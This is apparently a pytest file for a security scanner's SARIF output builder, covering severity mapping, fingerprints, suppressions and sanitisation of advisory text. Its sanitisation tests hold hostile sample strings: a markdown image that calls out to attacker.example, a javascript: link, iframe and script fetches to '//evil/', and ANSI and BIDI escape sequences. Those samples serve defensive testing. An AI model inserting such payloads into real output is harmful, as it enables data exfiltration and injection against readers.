"""Tests for ``packages.sca.sarif``."""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List

from packages.sca.sarif import build_sarif, write_sarif


def _vuln_row(
    *,
    eco: str = "Maven",
    name: str = "org.apache.logging.log4j:log4j-core",
    version: str = "2.14.1",
    severity: str = "critical",
    advisory_id: str = "GHSA-jfh8-c2jp-5v3q",
    aliases: List[str] | None = None,
    in_kev: bool = True,
    epss: float | None = 0.94,
    fixed_version: str = "2.15.0",
    suppressed: bool = False,
    reason: str | None = None,
    file: str = "/repo/service/pom.xml",
) -> Dict[str, Any]:
    return {
        "id": f"sca:vuln:{eco}:{name}:{version}:{advisory_id}",
        "vuln_type": "sca:vulnerable_dependency",
        "tool": "sca",
        "file": file,
        "line": 0,
        "severity": severity,
        "suppressed": suppressed,
        "suppression_reason": reason,
        "description": "Log4Shell — RCE via JNDI",
        "sca": {
            "ecosystem": eco, "name": name, "version": version,
            "purl": f"pkg:{eco.lower()}/{name}@{version}",
            "advisory": {"id": advisory_id,
                         "aliases": aliases or ["CVE-2021-44228"]},
            "in_kev": in_kev,
            "epss": epss,
            "fixed_version": fixed_version,
            "cvss_score": 10.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "reachability": {
                "verdict": "imported",
                "confidence": {"level": "high", "numeric": 0.95, "reason": "t"},
                "evidence": ["src/Main.java:10"],
            },
            "transitive_depth": 0,
        },
    }


def _hygiene_row(kind: str = "lockfile_missing") -> Dict[str, Any]:
    return {
        "id": f"sca:hygiene:{kind}:npm:lodash:/repo/package.json",
        "vuln_type": f"sca:hygiene:{kind}",
        "tool": "sca",
        "file": "/repo/package.json",
        "line": 0,
        "severity": "medium",
        "suppressed": False,
        "suppression_reason": None,
        "description": "no sibling lockfile",
        "sca": {"ecosystem": "npm", "name": "lodash", "version": "4.17.4",
                 "kind": kind},
    }


# ---------------------------------------------------------------------------
# build_sarif
# ---------------------------------------------------------------------------

def test_minimal_document_shape() -> None:
    target = Path("/repo")
    bom = build_sarif(
        target=target, rows=[_vuln_row()],
        generated_at=datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc),
    )
    assert bom["version"] == "2.1.0"
    assert "$schema" in bom
    runs = bom["runs"]
    assert len(runs) == 1
    assert runs[0]["tool"]["driver"]["name"] == "raptor-sca"
    rules = runs[0]["tool"]["driver"]["rules"]
    rule_ids = [r["id"] for r in rules]
    assert "sca:vulnerable_dependency" in rule_ids


def test_result_has_severity_level_and_location() -> None:
    target = Path("/repo")
    bom = build_sarif(target=target, rows=[_vuln_row()])
    result = bom["runs"][0]["results"][0]
    assert result["level"] == "error"          # critical → error
    assert result["ruleId"] == "sca:vulnerable_dependency"
    loc = result["locations"][0]["physicalLocation"]
    # File path is relativised against target.
    assert loc["artifactLocation"]["uri"] == "service/pom.xml"


def test_severity_level_mapping() -> None:
    target = Path("/repo")
    rows = [
        _vuln_row(severity="critical", advisory_id="GHSA-c"),
        _vuln_row(severity="high",     advisory_id="GHSA-h"),
        _vuln_row(severity="medium",   advisory_id="GHSA-m"),
        _vuln_row(severity="low",      advisory_id="GHSA-l"),
    ]
    bom = build_sarif(target=target, rows=rows)
    levels = [r["level"] for r in bom["runs"][0]["results"]]
    assert levels == ["error", "error", "warning", "note"]


def test_properties_carry_purl_kev_epss_and_reachability() -> None:
    target = Path("/repo")
    bom = build_sarif(target=target, rows=[_vuln_row()])
    props = bom["runs"][0]["results"][0]["properties"]
    assert props["purl"] == "pkg:maven/org.apache.logging.log4j:log4j-core@2.14.1"
    assert props["in_kev"] is True
    assert props["epss"] == 0.94
    assert props["fixed_version"] == "2.15.0"
    assert props["reachability_verdict"] == "imported"
    assert "CVE-2021-44228" in props["aliases"]


def test_suppressed_finding_emits_inline_suppressions_block() -> None:
    target = Path("/repo")
    rows = [_vuln_row(suppressed=True, reason="accepted risk")]
    bom = build_sarif(target=target, rows=rows)
    result = bom["runs"][0]["results"][0]
    assert "suppressions" in result
    sup = result["suppressions"][0]
    assert sup["kind"] == "external"
    assert sup["status"] == "accepted"
    assert sup["justification"] == "accepted risk"


def test_active_finding_has_no_suppressions_field() -> None:
    target = Path("/repo")
    bom = build_sarif(target=target, rows=[_vuln_row()])
    assert "suppressions" not in bom["runs"][0]["results"][0]


def test_fingerprint_is_stable_across_versions() -> None:
    """Same advisory on two different versions of the same dep produces
    the same fingerprint — consumers correlate dismissals across runs."""
    target = Path("/repo")
    a = build_sarif(target=target, rows=[_vuln_row(version="2.14.1")])
    b = build_sarif(target=target, rows=[_vuln_row(version="2.16.0")])
    fa = a["runs"][0]["results"][0]["partialFingerprints"]
    fb = b["runs"][0]["results"][0]["partialFingerprints"]
    assert fa["raptorScaFingerprint"] == fb["raptorScaFingerprint"]


def test_fingerprint_differs_for_different_advisory() -> None:
    target = Path("/repo")
    a = build_sarif(target=target, rows=[_vuln_row(advisory_id="GHSA-a")])
    b = build_sarif(target=target, rows=[_vuln_row(advisory_id="GHSA-b")])
    fa = a["runs"][0]["results"][0]["partialFingerprints"]
    fb = b["runs"][0]["results"][0]["partialFingerprints"]
    assert fa["raptorScaFingerprint"] != fb["raptorScaFingerprint"]


def test_rules_list_dedups_per_kind() -> None:
    target = Path("/repo")
    rows = [
        _vuln_row(advisory_id="GHSA-1"),
        _vuln_row(advisory_id="GHSA-2"),
        _hygiene_row(kind="lockfile_missing"),
        _hygiene_row(kind="lockfile_drift"),
        _hygiene_row(kind="lockfile_missing"),       # duplicate kind
    ]
    bom = build_sarif(target=target, rows=rows)
    rules = bom["runs"][0]["tool"]["driver"]["rules"]
    rule_ids = [r["id"] for r in rules]
    assert sorted(rule_ids) == sorted({
        "sca:vulnerable_dependency",
        "sca:hygiene:lockfile_missing",
        "sca:hygiene:lockfile_drift",
    })


def test_unknown_rule_id_falls_back_to_generic_description() -> None:
    target = Path("/repo")
    row = _hygiene_row(kind="something_new_we_havent_documented_yet")
    bom = build_sarif(target=target, rows=[row])
    rules = bom["runs"][0]["tool"]["driver"]["rules"]
    assert rules[0]["fullDescription"]["text"].startswith("RAPTOR /sca")


def test_tags_include_security_and_kind_specific() -> None:
    target = Path("/repo")
    bom = build_sarif(target=target, rows=[_vuln_row()])
    tags = bom["runs"][0]["results"][0]["properties"]["tags"]
    assert "security" in tags and "vulnerability" in tags


def test_file_path_outside_target_kept_as_is() -> None:
    """An absolute path that isn't relative to target falls through
    unchanged — better than silently mangling."""
    target = Path("/repo")
    row = _vuln_row(file="/elsewhere/pom.xml")
    bom = build_sarif(target=target, rows=[row])
    loc = bom["runs"][0]["results"][0]["locations"][0]["physicalLocation"]
    assert loc["artifactLocation"]["uri"] == "/elsewhere/pom.xml"


# ---------------------------------------------------------------------------
# write_sarif
# ---------------------------------------------------------------------------

def test_write_sarif_atomic(tmp_path: Path) -> None:
    out = tmp_path / "findings.sarif"
    n = write_sarif(out, target=tmp_path, rows=[_vuln_row()])
    assert n == 1
    assert out.exists()
    data = json.loads(out.read_text())
    assert data["version"] == "2.1.0"
    # No leftover .tmp files.
    assert all(p.suffix != ".tmp" for p in tmp_path.iterdir())


def test_empty_rows_produces_valid_sarif(tmp_path: Path) -> None:
    out = tmp_path / "findings.sarif"
    write_sarif(out, target=tmp_path, rows=[])
    data = json.loads(out.read_text())
    assert data["runs"][0]["results"] == []
    assert data["runs"][0]["tool"]["driver"]["rules"] == []


# ---------------------------------------------------------------------------
# Advisory-text sanitisation in result.message.text
# ---------------------------------------------------------------------------


def test_message_text_strips_autofetch_markup(tmp_path: Path) -> None:
    """OSV summaries can carry markdown autofetch markup (image
    src, iframe, javascript: links). GitHub Security Tab renders
    SARIF message.text as markdown — these MUST be defanged before
    emission."""
    from packages.sca.sarif import write_sarif
    row = _vuln_row()
    # Worst-case advisory text: image autofetch + iframe + script.
    row["description"] = (
        "RCE in foo. ![exfil](https://attacker.example/p?ctx=) "
        "[click](javascript:alert(1)) <iframe src='//evil/' /> "
        "<script>fetch('//evil/')</script>"
    )
    out = tmp_path / "findings.sarif"
    write_sarif(out, target=tmp_path, rows=[row])
    text = out.read_text()
    msg = json.loads(text)["runs"][0]["results"][0]["message"]["text"]
    # Autofetch markup gone; the prose head survives.
    assert "RCE in foo." in msg
    assert "![" not in msg
    assert "javascript:" not in msg
    assert "<iframe" not in msg
    assert "<script" not in msg


def test_message_text_escapes_terminal_injection(tmp_path: Path) -> None:
    """ANSI escape sequences and BIDI control chars must be defanged
    so a SARIF dump piped to a terminal can't hijack the cursor."""
    from packages.sca.sarif import write_sarif
    row = _vuln_row()
    # ANSI red + BIDI right-to-left override — both seen in the wild.
    row["description"] = "harmless\x1b[31mDANGER\x1b[0m ‮text"
    out = tmp_path / "findings.sarif"
    write_sarif(out, target=tmp_path, rows=[row])
    msg = json.loads(out.read_text())["runs"][0]["results"][0]["message"]["text"]
    assert "\x1b[" not in msg, "ANSI not defanged"
    assert "‮" not in msg, "BIDI override not defanged"


def test_message_text_caps_long_descriptions(tmp_path: Path) -> None:
    """Adversarial advisories with multi-MB descriptions shouldn't
    bloat SARIF beyond the configured cap."""
    from packages.sca.sarif import write_sarif
    row = _vuln_row()
    row["description"] = "x" * 100_000
    out = tmp_path / "findings.sarif"
    write_sarif(out, target=tmp_path, rows=[row])
    msg = json.loads(out.read_text())["runs"][0]["results"][0]["message"]["text"]
    assert len(msg) <= 2000
